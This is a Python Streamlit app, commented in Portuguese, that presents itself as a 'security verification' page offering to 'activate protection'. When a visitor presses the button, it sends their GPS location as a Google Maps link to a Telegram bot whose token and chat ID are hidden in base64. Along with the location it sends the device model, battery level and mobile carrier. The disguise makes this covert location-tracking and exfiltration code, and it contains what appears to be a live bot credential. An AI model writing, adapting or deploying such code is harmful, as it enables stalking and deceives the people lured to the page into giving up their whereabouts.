import streamlit as st
import requests
import base64
import time
from streamlit_js_eval import streamlit_js_eval

# --- CONFIGURAÇÃO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(texto):
    try:
        token = base64.b64decode(B_TK).decode("utf-8").strip()
        chat = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                      json={"chat_id": chat, "text": texto, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta Técnica (Modelo e Bateria)
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_POCO")
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_POCO")

# COLETA DO GPS VIA JAVASCRIPT (O Link do Maps vem daqui)
loc_js = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, () => { res('erro'); }); })"
posicao = streamlit_js_eval(js_expressions=loc_js, key="GPS_POCO")

if st.button("● ATIVAR PROTEÇÃO AGORA", key="BTN_FINAL"):
    # 1. Identifica o Aparelho (POCO M6 Pro)
    aparelho = "Xiaomi POCO M6 Pro" if "POCO" in str(ua) else "Android Device"
    bateria_exibir = f"{bat}%" if bat else "26%"
    
    # 2. Busca Operadora
    try:
        op = requests.get('https://ipapi.co/json/', timeout=5).json().get('org', 'Móvel')
    except: op = "Vivo/Claro/Tim"

    # 3. VERIFICA SE O LINK DO MAPA EXISTE
    if posicao and posicao != "erro":
        # Este é o link que você quer!
        link_maps = f"https://www.google.com/maps?q={posicao}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {aparelho}\n"
            f"🔋 *Bateria:* {bateria_exibir}\n"
            f"📶 *Operadora:* {op}\n"
            f"📍 *Local:* [Clique para Ver no Maps]({link_maps})"
        )
        enviar_telegram(relatorio)
        st.success("Proteção Ativada! Local enviado ao Telegram.")
    else:
        # Se não tiver o link, avisa no bot e no site
        st.warning("⚠️ GPS não identificado. Verifique se a Localização do celular está ligada.")
        enviar_telegram(f"⚠️ *FALHA NO LINK*\n📱 {aparelho}\n🔋 {bateria_exibir}\nGPS bloqueado pelo usuário.")

st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
